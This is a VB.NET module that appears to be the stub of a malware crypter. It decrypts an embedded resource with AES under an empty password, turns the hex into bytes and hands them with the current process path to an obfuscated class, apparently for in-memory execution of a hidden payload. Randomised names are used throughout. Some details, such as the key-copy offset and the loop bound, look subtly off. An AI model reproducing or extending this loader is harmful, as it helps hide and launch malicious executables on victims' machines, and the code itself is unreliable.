﻿Module Module2

    Dim Bytes() As Byte
    Dim Hex As String

    Sub main()

        Hex = AES_Decrypt(My.Resources.encrypted, "")

        Bytes = MkLApQrYg(Hex)


        Dim x As New kUkzHeoAaXc : x.pfCLkCaksx(Bytes, Process.GetCurrentProcess.MainModule.FileName)

    End Sub

    Public Function AES_Decrypt(ByVal input As String, ByVal pass As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim decrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = Convert.FromBase64String(input)
            decrypted = System.Text.ASCIIEncoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return decrypted
        Catch ex As Exception
        End Try
    End Function

    Function MkLApQrYg(ByVal EreoYZWBcArGjf As String) As Byte()
        Dim RPUgAdBnpwzv
        Dim PPfLZNPYpN() As Byte
        EreoYZWBcArGjf = Replace(EreoYZWBcArGjf, " ", "")
        ReDim PPfLZNPYpN((Len(EreoYZWBcArGjf) \ 2) - 1)
        For RPUgAdBnpwzv = 0 To UBound(PPfLZNPYpN) - 2
            PPfLZNPYpN(RPUgAdBnpwzv) = CLng("&H" & Mid$(EreoYZWBcArGjf, 2 * RPUgAdBnpwzv + 1, 2))
        Next
        MkLApQrYg = PPfLZNPYpN
    End Function

End Module
